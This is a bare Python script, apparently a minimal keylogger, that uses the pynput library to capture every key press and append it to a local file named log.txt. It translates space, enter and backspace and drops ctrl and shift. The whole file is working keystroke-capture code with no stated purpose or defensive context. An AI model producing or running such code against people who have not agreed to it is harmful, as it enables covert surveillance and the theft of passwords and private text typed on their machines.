from pynput.keyboard import Listener

def writeToFile(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.ctrl':
        letter = ''
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.backspace':
        letter = "\b"

    with open("log.txt", 'a')as f:
        f.write(letter)

with Listener(on_press = writeToFile) as l:
    l.join()